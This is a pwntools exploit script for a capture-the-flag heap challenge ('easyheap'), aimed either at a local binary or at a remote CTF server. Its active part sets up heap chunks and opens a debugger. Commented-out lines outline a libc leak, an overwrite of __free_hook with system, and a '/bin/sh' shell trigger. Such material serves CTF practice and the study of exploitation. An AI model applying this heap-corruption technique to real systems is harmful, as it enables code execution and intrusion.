import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./easyheap')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./easyheap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',26612)
			elf=ELF('./easyheap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,c):
			io.sendlineafter('Choice:','1')
			io.sendlineafter('Size:',str(a))
			io.sendafter('Content:',c)

		def delete(a):
			io.sendlineafter('Choice:','4')
			io.sendlineafter('id:',str(a))

		def edit(a,b,c):
			io.sendlineafter('Choice:','2')
			io.sendlineafter('id:',str(a))
			io.sendlineafter('Size:',str(b))
			io.sendafter('Content:',c)


		def show(a):
			io.sendlineafter('Choice:','3')
		

		add(0x20,'aaaa\n')
		add(0xf0,'aaaa\n')
		add(0x20,'aaaa\n')
		delete(1)
		# edit(0,0x50,'a'*0x50)
		# show(0)
		# io.recvuntil('a'*0x50)
		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# edit(0,0x160,'/bin/sh\x00'+'a'*0x150+p64(libc.sym['__free_hook']))
		# edit(2,0x8,p64(libc.sym['system']))
		# delete(0)
		







		# success('libc_base:'+hex(libc_base))
		gdb.attach(io)
		pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue